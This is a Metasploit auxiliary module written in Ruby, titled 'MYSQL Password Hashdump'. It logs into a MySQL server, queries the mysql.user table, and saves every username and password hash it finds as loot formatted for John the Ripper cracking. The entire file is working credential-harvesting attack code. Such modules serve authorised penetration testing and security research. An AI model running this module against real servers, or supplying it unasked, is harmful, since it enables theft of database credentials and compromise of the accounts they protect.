##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'MYSQL Password Hashdump',
      'Description'    => %Q{
          This module extracts the usernames and encrypted password
        hashes from a MySQL server and stores them for later cracking.
      },
      'Author'         => ['theLightCosine'],
      'License'        => MSF_LICENSE
    )
  end

  def run_host(ip)

    if (not mysql_login_datastore)
      return
    end

    service_data = {
        address: ip,
        port: rport,
        service_name: 'mysql',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    credential_data = {
        module_fullname: self.fullname,
        origin_type: :service,
        private_data: datastore['PASSWORD'],
        private_type: :password,
        username: datastore['USERNAME']
    }

    credential_data.merge!(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
    }
    login_data.merge!(service_data)

    create_credential_login(login_data)

    #Grabs the username and password hashes and stores them as loot
    res = mysql_query("SELECT user,password from mysql.user")
    if res.nil?
      print_error("There was an error reading the MySQL User Table")
      return
    end

    service_data = {
      address: ::Rex::Socket.getaddress(rhost,true),
      port: rport,
      service_name: 'mysql',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
        origin_type: :service,
        jtr_format: 'mysql,mysql-sha1',
        module_fullname: self.fullname,
        private_type: :nonreplayable_hash
    }

    credential_data.merge!(service_data)

    if res.size > 0
      res.each do |row|
        credential_data[:username]     = row[0]
        credential_data[:private_data] = row[1]
        print_good("Saving HashString as Loot: #{row[0]}:#{row[1]}")
        credential_core = create_credential(credential_data)
        login_data = {
            core: credential_core,
            status: Metasploit::Model::Login::Status::UNTRIED
        }
        login_data.merge!(service_data)
        create_credential_login(login_data)
      end
    end

  end




end
